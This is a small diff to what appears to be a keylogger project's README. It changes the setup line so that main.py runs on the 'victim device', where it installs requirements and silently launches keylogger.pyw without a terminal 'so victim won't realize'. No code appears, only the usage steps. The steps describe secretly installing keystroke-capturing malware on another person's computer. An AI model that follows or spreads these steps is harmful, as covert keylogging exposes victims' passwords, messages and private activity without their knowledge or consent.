@@ -9,7 +9,7 @@
 
 To try on your device run Keylogger.py 
 
-to run on your attacker device run main.py it will install requirements and 
+to run on your victim device run main.py it will install requirements and 
 automatically run keylogger.pyw (without a terminal) so victim won't realize 
 
 
